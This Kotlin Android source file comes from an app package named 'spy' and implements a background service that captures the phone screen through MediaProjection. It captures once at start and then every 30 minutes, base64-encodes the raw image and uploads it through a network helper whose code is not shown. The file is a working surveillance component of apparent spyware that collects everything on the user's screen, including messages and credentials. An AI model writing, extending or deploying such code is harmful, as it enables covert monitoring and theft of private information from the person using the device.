package com.gauravhanna.spy

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import androidx.work.*
import java.util.concurrent.TimeUnit

class ScreenshotCaptureService : Service() {

    companion object {
        private const val TAG = "ScreenshotService"
        private const val NOTIFICATION_ID = 2001
        private const val CHANNEL_ID = "screenshot_channel"
        private const val VIRTUAL_DISPLAY_NAME = "ScreenshotDisplay"

        private var mediaProjection: MediaProjection? = null
        private var virtualDisplay: VirtualDisplay? = null
        private var imageReader: ImageReader? = null
        private var instance: ScreenshotCaptureService? = null

        fun setMediaProjection(resultCode: Int, data: Intent) {
            val projectionManager = instance?.getSystemService(MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
            mediaProjection = projectionManager?.getMediaProjection(resultCode, data)
            Log.d(TAG, "MediaProjection set")
        }

        fun isRunning(): Boolean = instance != null
    }

    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null
    private var workManager: WorkManager? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        workManager = WorkManager.getInstance(this)
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        startBackgroundThread()
        scheduleScreenshotCapture()

        Log.d(TAG, "✅ ScreenshotCaptureService created")
    }

    private fun scheduleScreenshotCapture() {
        // Using WorkManager instead of scheduleAtFixedRate
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val screenshotWork = PeriodicWorkRequestBuilder<ScreenshotWorker>(
            30, TimeUnit.MINUTES
        ).setConstraints(constraints).build()

        workManager?.enqueueUniquePeriodicWork(
            "screenshot_capture_work",
            ExistingPeriodicWorkPolicy.KEEP,
            screenshotWork
        )

        // Also capture immediately
        captureScreenshot()
    }

    // Worker class for WorkManager
    class ScreenshotWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
        override fun doWork(): Result {
            return try {
                captureScreenshotInternal()
                Result.success()
            } catch (e: Exception) {
                Log.e(TAG, "Screenshot capture failed: ${e.message}")
                Result.retry()
            }
        }

        private fun captureScreenshotInternal() {
            val service = instance ?: return
            service.captureScreenshot()
        }
    }

    private fun captureScreenshot() {
        try {
            if (mediaProjection == null) {
                Log.e(TAG, "MediaProjection is null")
                return
            }

            val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()

            // Fix for deprecated getDefaultDisplay
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val display = windowManager.currentWindowMetrics?.bounds
                val width = display?.width() ?: 1080
                val height = display?.height() ?: 1920
                val density = resources.displayMetrics.densityDpi

                createVirtualDisplayAndCapture(width, height, density)
            } else {
                @Suppress("DEPRECATION")
                windowManager.defaultDisplay.getMetrics(metrics)
                val width = metrics.widthPixels
                val height = metrics.heightPixels
                val density = metrics.densityDpi

                createVirtualDisplayAndCapture(width, height, density)
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error capturing screenshot: ${e.message}")
        }
    }

    private fun createVirtualDisplayAndCapture(width: Int, height: Int, density: Int) {
        try {
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                VIRTUAL_DISPLAY_NAME,
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, backgroundHandler
            )

            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    val planes = image.planes
                    if (planes.isNotEmpty()) {
                        val buffer = planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        val base64Image = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                        NetworkHelper.sendScreenshot(applicationContext, base64Image)
                        Log.d(TAG, "📸 Screenshot captured and sent")
                    }
                    image.close()
                }
            }, backgroundHandler)

            // Clean up after capture
            Handler(backgroundHandler?.looper ?: mainLooper).postDelayed({
                virtualDisplay?.release()
                imageReader?.close()
                virtualDisplay = null
                imageReader = null
            }, 3000)

        } catch (e: Exception) {
            Log.e(TAG, "Error in capture: ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screenshot Capture",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            if (manager != null) {
                manager.createNotificationChannel(channel)
            }
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Screenshot Service")
            .setContentText("Capturing screenshots...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("ScreenshotBackground").apply { start() }
        backgroundHandler = Handler(backgroundThread?.looper!!)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        backgroundThread?.quitSafely()
        Log.d(TAG, "ScreenshotCaptureService destroyed")
    }
}